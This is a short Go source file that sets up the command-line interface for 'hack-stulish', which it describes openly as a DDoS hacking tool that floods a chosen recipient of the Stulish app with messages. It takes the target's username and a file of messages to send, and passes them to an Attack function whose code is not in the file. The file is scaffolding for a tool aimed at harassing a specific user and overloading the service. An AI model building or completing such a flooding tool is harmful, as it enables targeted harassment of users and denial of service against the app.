package main

import (
	"os"

	"github.com/spf13/cobra"
)

var (
	username        string
	messageFilePath string
)

var rootCmd = &cobra.Command{
	Use:  "hack-stulish",
	Long: `A DDoS attack hacking tool to create message flood to the recipient of the Stulish app.`,
	Run: func(cmd *cobra.Command, args []string) {
		Attack(username, messageFilePath)
	},
}

func init() {
	rootCmd.Flags().StringVarP(&username, "username", "u", "", "Stulish username of the target recipient")
	rootCmd.Flags().StringVarP(&messageFilePath, "message-file", "m", "", "a text file containing messages to be sent")
}

// Execute bootstaps the CLI.
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		logError(err.Error())
		os.Exit(1)
	}
}
